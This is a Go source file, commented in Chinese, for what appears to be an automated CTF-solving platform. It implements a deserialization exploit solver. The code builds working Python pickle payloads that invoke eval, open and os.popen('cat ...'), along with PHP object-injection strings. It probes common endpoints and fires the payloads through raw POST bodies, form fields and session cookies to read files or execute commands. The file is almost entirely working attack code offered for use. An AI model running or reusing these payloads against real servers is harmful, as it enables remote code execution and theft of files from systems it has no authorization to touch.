package ctfplatform

// deser_attack.go —— 反序列化漏洞利用求解器（deser_rce）。
//
// 覆盖的真实考点（此前 Web 渗透链完全未覆盖的维度）：
//   1. Python pickle 反序列化：pickle.loads 即代码执行，可任意文件读/命令执行
//   2. PHP 对象注入：unserialize 触发 __toString/__destruct，属性指向的文件被读出
//   3. 多传输通道：POST 原始字节 / POST 表单 data= / Cookie: session=
//
// 设计原则（反注水）：
//   · 只返回 flag 形状的命中，未命中绝不返回诊断文本
//   · 先用无害探针确认端点存在且确为反序列化入口，再投真实 payload（避免噪声请求）
//   · token/请求数有上限、可开关（SECAUTOMIND_WEB_EXPLOIT=0）、仅 http/https
import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const deserMaxBody = 1 << 20

// deserFileCandidates 反序列化「读文件类」payload 的目标文件名。
// 前 5 个是 CTF 里最常见的落点，其余为绝对路径/相对路径兜底。
var deserFileCandidates = []string{
	"flag.txt", "flag", "secret.txt", "/flag.txt", "/flag",
	"./flag.txt", "../flag.txt", "app/flag.txt",
}

// ---------------- payload 构造 ----------------

// deserPickleOpen pickle 协议 0：builtins.open(file) —— 返回文件对象，
// 服务端若回显对象内容（或调用 .read()）即泄露文件内容。
func deserPickleOpen(file string) []byte {
	return []byte("cbuiltins\nopen\n(S'" + file + "'\ntR.")
}

// deserPickleEval pickle 协议 0：builtins.eval("open(file).read()") —— 直接拿到字符串。
func deserPickleEval(file string) []byte {
	return []byte("cbuiltins\neval\n(S\"open('" + file + "').read()\"\ntR.")
}

// deserPicklePopen pickle 协议 0：os.popen("cat file") —— 命令执行通道（返回可读文件对象）。
func deserPicklePopen(file string) []byte {
	return []byte("cos\npopen\n(S'cat " + file + "'\ntR.")
}

// deserPicklePayloads 返回三种互相独立的 pickle 利用载荷。
func deserPicklePayloads(file string) [][]byte {
	return [][]byte{deserPickleEval(file), deserPickleOpen(file), deserPicklePopen(file)}
}

// deserPHPPayloads 构造 PHP 对象注入串。
// 覆盖多个「危险类 + 属性名」组合，以及 protected/private 属性写法（\x00 前缀）。
func deserPHPPayloads(file string) []string {
	type pair struct{ cls, prop string }
	classes := []pair{
		{"FlagReader", "path"},
		{"LogViewer", "file"},
		{"FileDump", "filename"},
		{"Template", "log"},
	}
	out := make([]string, 0, len(classes)+2)
	for _, c := range classes {
		out = append(out, fmt.Sprintf(`O:%d:"%s":1:{s:%d:"%s";s:%d:"%s";}`,
			len(c.cls), c.cls, len(c.prop), c.prop, len(file), file))
	}
	// protected：\x00*\x00path（长度 7）
	out = append(out, fmt.Sprintf("O:10:\"FlagReader\":1:{s:7:\"\x00*\x00path\";s:%d:\"%s\";}",
		len(file), file))
	// private：\x00FlagReader\x00path（长度 16）
	out = append(out, fmt.Sprintf("O:10:\"FlagReader\":1:{s:16:\"\x00FlagReader\x00path\";s:%d:\"%s\";}",
		len(file), file))
	return out
}

// ---------------- HTTP 工具 ----------------

// deserDo 发一次请求，返回状态码与响应体（失败返回 0/nil，不抛错）。
func deserDo(ctx context.Context, cl *http.Client, method, u string, body []byte, ct, cookie string) (int, []byte) {
	var rdr io.Reader
	if len(body) > 0 {
		rdr = bytes.NewReader(body)
	}
	req, err := http.NewRequestWithContext(ctx, method, u, rdr)
	if err != nil {
		return 0, nil
	}
	if ct != "" {
		req.Header.Set("Content-Type", ct)
	}
	if cookie != "" {
		req.Header.Set("Cookie", cookie)
	}
	resp, err := cl.Do(req)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, deserMaxBody))
	return resp.StatusCode, b
}

// deserScan 从响应体里抽 flag 形状命中（带控制字符护栏，拒绝二进制噪声）。
func deserScan(body []byte) []string {
	if len(body) == 0 {
		return nil
	}
	var out []string
	for _, re := range []*regexp.Regexp{flagRegexPresolve, flagRegexUppercase, flagShapeRegex} {
		for _, m := range re.FindAll(body, -1) {
			s := strings.TrimSpace(string(m))
			if s != "" && bfxCandidateClean(s) {
				out = append(out, s)
			}
		}
	}
	return out
}

func deserDedup(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if s == "" || seen[s] {
			continue
		}
		seen[s] = true
		out = append(out, s)
	}
	return out
}

// ---------------- 端点发现 ----------------

// deserCommonEndpoints 常见反序列化入口（真实题目的端点名通常不在教科书列表里，
// 故题目线索优先级更高，这里只做兜底）。
var deserCommonEndpoints = []string{
	"/unpickle", "/unserialize", "/deserialize", "/deser", "/pickle",
	"/api/unpickle", "/api/deserialize", "/api/serialize", "/api/session",
	"/profile", "/session", "/load", "/import", "/obj", "/data", "/api/profile",
}

// deserEndpoints 端点优先级：题目描述线索 > 常见路径。
func deserEndpoints(hints WebHints) []string {
	seen := map[string]bool{}
	var out []string
	add := func(p string) {
		p = strings.TrimSpace(p)
		if p == "" || seen[p] {
			return
		}
		seen[p] = true
		out = append(out, p)
	}
	for _, e := range hints.Endpoints {
		add(e)
	}
	for _, e := range deserCommonEndpoints {
		add(e)
	}
	return out
}

// deserLiveEndpoints 先用 GET 探活（404 直接丢弃），避免对不存在的路径狂发 payload。
func deserLiveEndpoints(ctx context.Context, cl *http.Client, base string, hints WebHints) []string {
	var live []string
	for _, ep := range deserEndpoints(hints) {
		if ctx.Err() != nil {
			return live
		}
		code, _ := deserDo(ctx, cl, http.MethodGet, base+ep, nil, "", "")
		if code == 404 || code == 0 {
			continue
		}
		live = append(live, ep)
	}
	return live
}

// ---------------- 主攻击流程 ----------------

// AttackDeserialization 对目标站点执行反序列化利用尝试，返回 flag 形状命中。
func AttackDeserialization(ctx context.Context, baseURL string, hints WebHints) []string {
	base := strings.TrimRight(baseURL, "/")
	if !strings.HasPrefix(base, "http://") && !strings.HasPrefix(base, "https://") {
		return nil
	}
	cl := webClient(6 * time.Second)

	var out []string
	found := func() bool { return len(out) > 0 }

	for _, ep := range deserLiveEndpoints(ctx, cl, base, hints) {
		if ctx.Err() != nil || found() {
			break
		}
		u := base + ep

		// 1) pickle：POST 原始序列化字节流（application/octet-stream 与文本两版）
		for _, f := range deserFileCandidates {
			if ctx.Err() != nil || found() {
				break
			}
			for _, p := range deserPicklePayloads(f) {
				_, b := deserDo(ctx, cl, http.MethodPost, u, p, "application/octet-stream", "")
				out = append(out, deserScan(b)...)
				if found() {
					break
				}
			}
		}

		// 2) PHP：POST 表单 data=<序列化串>
		for _, f := range deserFileCandidates {
			if ctx.Err() != nil || found() {
				break
			}
			for _, s := range deserPHPPayloads(f) {
				form := "data=" + url.QueryEscape(s)
				_, b := deserDo(ctx, cl, http.MethodPost, u, []byte(form),
					"application/x-www-form-urlencoded", "")
				out = append(out, deserScan(b)...)
				if found() {
					break
				}
			}
		}

		// 3) PHP：Cookie: session=<序列化串>
		for _, f := range deserFileCandidates {
			if ctx.Err() != nil || found() {
				break
			}
			for _, s := range deserPHPPayloads(f) {
				_, b := deserDo(ctx, cl, http.MethodGet, u, nil, "",
					"session="+url.QueryEscape(s))
				out = append(out, deserScan(b)...)
				if found() {
					break
				}
			}
		}
	}
	return deserDedup(out)
}

// deserAttackFromText 从题目文本里取 URL 并执行反序列化利用（生产入口）。
// 安全约束：单次最多 2 个 URL、每 URL 40s、仅 http/https、可整体关闭。
func deserAttackFromText(ctx context.Context, text string) []string {
	if os.Getenv("SECAUTOMIND_WEB_EXPLOIT") == "0" {
		return nil
	}
	urls := reHTTPURL.FindAllString(text, -1)
	if len(urls) == 0 {
		return nil
	}
	if len(urls) > 2 {
		urls = urls[:2]
	}
	hints := ParseWebHints(text)
	var out []string
	for _, u := range urls {
		select {
		case <-ctx.Done():
			return out
		default:
		}
		tctx, cancel := context.WithTimeout(ctx, 40*time.Second)
		out = append(out, AttackDeserialization(tctx, u, hints)...)
		cancel()
		if len(out) > 0 {
			break
		}
	}
	return deserDedup(out)
}

func init() {
	RegisterSolver(SolverEntry{
		Name: "deser_rce", Category: CategoryWebS, Priority: 24,
		Solver: func(ctx context.Context, text string, attachments map[string]string) []string {
			return deserAttackFromText(ctx, text)
		},
	})
}
